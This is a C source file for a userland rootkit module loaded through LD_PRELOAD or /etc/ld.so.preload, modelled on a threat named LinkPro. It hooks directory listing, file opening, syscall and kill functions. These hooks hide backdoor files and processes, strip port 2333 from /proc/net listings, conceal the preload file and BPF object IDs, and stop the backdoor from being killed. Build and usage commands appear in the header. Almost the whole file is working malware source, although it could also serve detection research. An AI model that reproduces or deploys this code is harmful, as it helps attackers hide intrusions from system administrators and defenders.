/*
 * LinkPro-style LD_PRELOAD module: hooks to hide backdoor artifacts and port.
 * When loaded via /etc/ld.so.preload, hides:
 *   - Keywords in directory listings: .rkit_vault, rkit-agent, getdents_preload,
 *     ld.so.preload, .system
 *   - /proc PIDs whose cmdline contains .rkit_vault or rkit-agent
 *   - Port 2333 in /proc/net/tcp, tcp6, udp, udp6
 *   - ld.so.preload from open/fopen (returns ENOENT)
 *   - kill() against our backdoor process (no-op)
 *   - BPF prog/map/link IDs in bpf() GET_NEXT_ID iteration (hides from bpftool)
 *
 * Build: cc -shared -fPIC -o getdents_preload.so getdents_preload.c -ldl
 * Use:  LD_PRELOAD=/path/to/getdents_preload.so ls /proc
 */

#define _GNU_SOURCE
#include <dlfcn.h>
#include <errno.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <sys/syscall.h>
#include <fcntl.h>

/* Our backdoor port (hex 0x91B in /proc/net) and hide keywords */
#define HIDDEN_PORT     2333
#define HIDDEN_PORT_HEX "91B"
#define KEYWORD_VAULT   ".rkit_vault"
#define KEYWORD_AGENT   "rkit-agent"
#define KEYWORD_PRELOAD "getdents_preload"
#define KEYWORD_LDPRE   "ld.so.preload"
#define KEYWORD_SYSTEM  ".system"

/* BPF syscall commands for iterator (hide from bpftool) */
#define BPF_PROG_GET_NEXT_ID  11
#define BPF_MAP_GET_NEXT_ID   12
#define BPF_LINK_GET_NEXT_ID  13
#define BPF_HIDE_FILE         "/tmp/.rkit_vault/.bpfinfo"

/* bpf_attr for GET_NEXT_ID: start_id (in), next_id (out) */
struct bpf_iter_attr {
	uint32_t start_id;
	uint32_t next_id;
};

#define MAX_HIDE_IDS 128
static uint32_t hide_prog_ids[MAX_HIDE_IDS];
static uint32_t hide_map_ids[MAX_HIDE_IDS];
static uint32_t hide_link_ids[MAX_HIDE_IDS];
static int n_hide_prog, n_hide_map, n_hide_link;
static int hide_ids_loaded;

static void load_bpf_hide_ids(void) {
	FILE *f;
	char line[64];
	uint32_t id;
	if (hide_ids_loaded) return;
	hide_ids_loaded = 1;
	f = fopen(BPF_HIDE_FILE, "r");
	if (!f) return;
	while (fgets(line, sizeof(line), f) && (n_hide_prog < MAX_HIDE_IDS || n_hide_map < MAX_HIDE_IDS || n_hide_link < MAX_HIDE_IDS)) {
		if (sscanf(line, "p %u", &id) == 1 && n_hide_prog < MAX_HIDE_IDS)
			hide_prog_ids[n_hide_prog++] = id;
		else if (sscanf(line, "m %u", &id) == 1 && n_hide_map < MAX_HIDE_IDS)
			hide_map_ids[n_hide_map++] = id;
		else if (sscanf(line, "l %u", &id) == 1 && n_hide_link < MAX_HIDE_IDS)
			hide_link_ids[n_hide_link++] = id;
	}
	fclose(f);
}

static int should_hide_id(uint32_t id, int cmd) {
	int i;
	load_bpf_hide_ids();
	if (cmd == BPF_PROG_GET_NEXT_ID) {
		for (i = 0; i < n_hide_prog; i++)
			if (hide_prog_ids[i] == id) return 1;
	} else if (cmd == BPF_MAP_GET_NEXT_ID) {
		for (i = 0; i < n_hide_map; i++)
			if (hide_map_ids[i] == id) return 1;
	} else if (cmd == BPF_LINK_GET_NEXT_ID) {
		for (i = 0; i < n_hide_link; i++)
			if (hide_link_ids[i] == id) return 1;
	}
	return 0;
}

static int path_contains_ldpreload(const char *path) {
    if (!path) return 0;
    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;
    return (strstr(path, "ld.so.preload") != NULL);
}

static int path_is_proc_net(const char *path) {
    if (!path) return 0;
    return (strstr(path, "/proc/net/tcp") != NULL ||
            strstr(path, "/proc/net/tcp6") != NULL ||
            strstr(path, "/proc/net/udp") != NULL ||
            strstr(path, "/proc/net/udp6") != NULL);
}

/* Check if filename (dirent name) should be hidden in directory listing */
static int name_should_hide(const char *name) {
    if (!name || !*name) return 0;
    if (strstr(name, KEYWORD_VAULT)) return 1;
    if (strstr(name, KEYWORD_AGENT)) return 1;
    if (strstr(name, KEYWORD_PRELOAD)) return 1;
    if (strstr(name, "libld.so")) return 1;   /* LinkPro artifact name */
    if (strstr(name, KEYWORD_LDPRE)) return 1;
    if (strstr(name, KEYWORD_SYSTEM)) return 1;
    if (strstr(name, "sshids")) return 1;     /* LinkPro artifact */
    return 0;
}

/* Check if string is numeric (PID) */
static int is_numeric_pid(const char *s) {
    if (!s || !*s) return 0;
    for (; *s; s++) if (*s < '0' || *s > '9') return 0;
    return 1;
}

/* Read /proc/<pid>/cmdline and return 1 if it contains our keyword */
static int cmdline_contains_keyword(pid_t pid) {
    char path[64];
    char buf[512];
    FILE *f;
    size_t n;
    snprintf(path, sizeof(path), "/proc/%d/cmdline", (int)pid);
    f = fopen(path, "re");
    if (!f) return 0;
    n = fread(buf, 1, sizeof(buf) - 1, f);
    fclose(f);
    if (n == 0) return 0;
    buf[n] = '\0';
    /* cmdline is null-separated; replace with space for strstr */
    for (size_t i = 0; i < n; i++)
        if (buf[i] == '\0') buf[i] = ' ';
    return (strstr(buf, KEYWORD_VAULT) != NULL || strstr(buf, KEYWORD_AGENT) != NULL);
}

/* Get path for fd (e.g. /proc/123); callers should free. */
static char *fd_to_path(int fd) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    return realpath(path, NULL);
}

/* --- fopen / fopen64 --- */
typedef FILE *(*fopen_fn)(const char *, const char *);

static FILE *filter_proc_net_content(const char *path, const char *mode, FILE *real_fp) {
    char *line = NULL;
    size_t cap = 0;
    ssize_t len;
    (void)path;
    (void)mode;
    FILE *tmp = tmpfile();
    if (!tmp) { fclose(real_fp); return NULL; }
    while ((len = getline(&line, &cap, real_fp)) != -1) {
        /* Remove lines that contain our port 2333 = 0x91B in hex (local or remote) */
        if (strstr(line, ":91B") || strstr(line, " 91B "))
            continue;
        fwrite(line, 1, (size_t)len, tmp);
    }
    free(line);
    fclose(real_fp);
    rewind(tmp);
    return tmp;
}

FILE *fopen(const char *pathname, const char *mode) {
    static fopen_fn real_fopen;
    if (!real_fopen) real_fopen = (fopen_fn)dlsym(RTLD_NEXT, "fopen");
    if (path_contains_ldpreload(pathname)) {
        errno = ENOENT;
        return NULL;
    }
    FILE *fp = real_fopen(pathname, mode);
    if (!fp) return NULL;
    if (path_is_proc_net(pathname))
        return filter_proc_net_content(pathname, mode, fp);
    return fp;
}

#ifdef _LARGEFILE64_SOURCE
FILE *fopen64(const char *pathname, const char *mode) {
    return fopen(pathname, mode);
}
#endif

/* --- open / open64 --- */
typedef int (*open_fn)(const char *, int, ...);

int open(const char *pathname, int flags, ...) {
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode = (mode_t)va_arg(ap, int);
        va_end(ap);
    }
    static open_fn real_open;
    if (!real_open) real_open = (open_fn)dlsym(RTLD_NEXT, "open");
    if (path_contains_ldpreload(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_open(pathname, flags, mode);
}

#ifdef _LARGEFILE64_SOURCE
typedef int (*open64_fn)(const char *, int, ...);
int open64(const char *pathname, int flags, ...) {
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode = (mode_t)va_arg(ap, int);
        va_end(ap);
    }
    static open64_fn real_open64;
    if (!real_open64) real_open64 = (open64_fn)dlsym(RTLD_NEXT, "open64");
    if (path_contains_ldpreload(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_open64(pathname, flags, mode);
}
#endif

/* --- getdents (linux_dirent) --- */
struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

typedef long (*getdents_fn)(unsigned int, struct linux_dirent *, unsigned int);

static long filter_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count,
                            long (*real)(unsigned int, struct linux_dirent *, unsigned int)) {
    long n = real(fd, dirp, count);
    if (n <= 0) return n;
    char *path = fd_to_path(fd);
    int in_proc = path && (strncmp(path, "/proc", 5) == 0);
    free(path);
    char *p = (char *)dirp;
    char *end = p + n;
    char *write_at = p;
    while (p < end) {
        struct linux_dirent *d = (struct linux_dirent *)p;
        if (d->d_reclen == 0) break;
        int hide = 0;
        if (name_should_hide(d->d_name))
            hide = 1;
        else if (in_proc && is_numeric_pid(d->d_name)) {
            int pid = atoi(d->d_name);
            if (cmdline_contains_keyword(pid)) hide = 1;
        }
        if (!hide) {
            if (write_at != p)
                memmove(write_at, p, (size_t)d->d_reclen);
            write_at += d->d_reclen;
        }
        p += d->d_reclen;
    }
    return (long)(write_at - (char *)dirp);
}

long getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    static getdents_fn real_getdents;
    if (!real_getdents) real_getdents = (getdents_fn)dlsym(RTLD_NEXT, "getdents");
    return filter_getdents(fd, dirp, count, real_getdents);
}

/* --- getdents64 (linux_dirent64) --- */
#if defined(__linux__)
#include <sys/types.h>
#endif
struct linux_dirent64 {
    unsigned long long d_ino;   /* ino64_t on Linux */
    long long d_off;            /* off64_t on Linux */
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

typedef ssize_t (*getdents64_fn)(int, void *, size_t);

static long filter_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count,
                              getdents64_fn real) {
    long n = (long)real((int)fd, (void *)dirp, (size_t)count);
    if (n <= 0) return n;
    char *path = fd_to_path(fd);
    int in_proc = path && (strncmp(path, "/proc", 5) == 0);
    free(path);
    char *p = (char *)dirp;
    char *end = p + n;
    char *write_at = p;
    while (p < end) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)p;
        if (d->d_reclen == 0) break;
        int hide = 0;
        if (name_should_hide(d->d_name))
            hide = 1;
        else if (in_proc && is_numeric_pid(d->d_name)) {
            int pid = atoi(d->d_name);
            if (cmdline_contains_keyword(pid)) hide = 1;
        }
        if (!hide) {
            if (write_at != p)
                memmove(write_at, p, (size_t)d->d_reclen);
            write_at += d->d_reclen;
        }
        p += d->d_reclen;
    }
    return (long)(write_at - (char *)dirp);
}

ssize_t getdents64(int fd, void *dirp, size_t count) {
    static getdents64_fn real_getdents64;
    if (!real_getdents64) real_getdents64 = (getdents64_fn)dlsym(RTLD_NEXT, "getdents64");
    return (ssize_t)filter_getdents64((unsigned int)fd, (struct linux_dirent64 *)dirp, (unsigned int)count, real_getdents64);
}

/* --- readdir / readdir64 --- */
typedef struct dirent *(*readdir_fn)(DIR *);

static struct dirent *readdir_skip_hidden(DIR *dirp, readdir_fn real_readdir, int is64) {
    int fd = dirfd(dirp);
    char *path = fd_to_path(fd);
    int in_proc = path && (strncmp(path, "/proc", 5) == 0);
    free(path);
    struct dirent *d;
    while ((d = real_readdir(dirp)) != NULL) {
        if (name_should_hide(d->d_name)) continue;
        if (in_proc && is_numeric_pid(d->d_name)) {
            int pid = atoi(d->d_name);
            if (cmdline_contains_keyword(pid)) continue;
        }
        return d;
    }
    return NULL;
}

struct dirent *readdir(DIR *dirp) {
    static readdir_fn real_readdir;
    if (!real_readdir) real_readdir = (readdir_fn)dlsym(RTLD_NEXT, "readdir");
    return readdir_skip_hidden(dirp, real_readdir, 0);
}

#ifdef _LARGEFILE64_SOURCE
typedef struct dirent64 *(*readdir64_fn)(DIR *);
struct dirent64 *readdir64(DIR *dirp) {
    static readdir64_fn real_readdir64;
    if (!real_readdir64) real_readdir64 = (readdir64_fn)dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *d;
    int fd = dirfd(dirp);
    char *path = fd_to_path(fd);
    int in_proc = path && (strncmp(path, "/proc", 5) == 0);
    free(path);
    while ((d = real_readdir64(dirp)) != NULL) {
        if (name_should_hide(d->d_name)) continue;
        if (in_proc && is_numeric_pid(d->d_name)) {
            int pid = atoi(d->d_name);
            if (cmdline_contains_keyword(pid)) continue;
        }
        return d;
    }
    return NULL;
}
#endif

/* --- syscall (bpf GET_NEXT_ID filter) --- */
typedef long (*syscall_fn)(long, ...);

static long filter_bpf_get_next_id(int cmd, struct bpf_iter_attr *attr, unsigned int size) {
	syscall_fn real_syscall = (syscall_fn)dlsym(RTLD_NEXT, "syscall");
	long ret;
	int iterations = 0;
	(void)size;
	if (!attr) return real_syscall(SYS_bpf, cmd, attr, size);
#define MAX_ITER 512
	while (iterations++ < MAX_ITER) {
		ret = real_syscall(SYS_bpf, cmd, attr, sizeof(*attr));
		if (ret != 0)
			return ret; /* ENOENT or error: stop iteration */
		if (!should_hide_id(attr->next_id, cmd))
			return 0; /* caller can use this id */
		attr->start_id = attr->next_id; /* skip to next */
	}
	return -ENOENT; /* give up after many skips */
}

long syscall(long number, ...) {
	va_list ap;
	long a1, a2, a3, a4, a5, a6;
	unsigned int a3u;
	syscall_fn real_syscall = (syscall_fn)dlsym(RTLD_NEXT, "syscall");
	va_start(ap, number);
	a1 = va_arg(ap, long);
	a2 = va_arg(ap, long);
	a3 = va_arg(ap, long);
	a4 = va_arg(ap, long);
	a5 = va_arg(ap, long);
	a6 = va_arg(ap, long);
	va_end(ap);
	a3u = (unsigned int)a3;
	if (number == (long)SYS_bpf && (a1 == BPF_PROG_GET_NEXT_ID || a1 == BPF_MAP_GET_NEXT_ID || a1 == BPF_LINK_GET_NEXT_ID))
		return filter_bpf_get_next_id((int)a1, (struct bpf_iter_attr *)a2, a3u);
	return real_syscall(number, a1, a2, a3, a4, a5, a6);
}

/* --- kill --- */
typedef int (*kill_fn)(pid_t, int);

int kill(pid_t pid, int sig) {
    static kill_fn real_kill;
    if (!real_kill) real_kill = (kill_fn)dlsym(RTLD_NEXT, "kill");
    if (cmdline_contains_keyword(pid))
        return 0; /* pretend success, don't kill our backdoor */
    return real_kill(pid, sig);
}
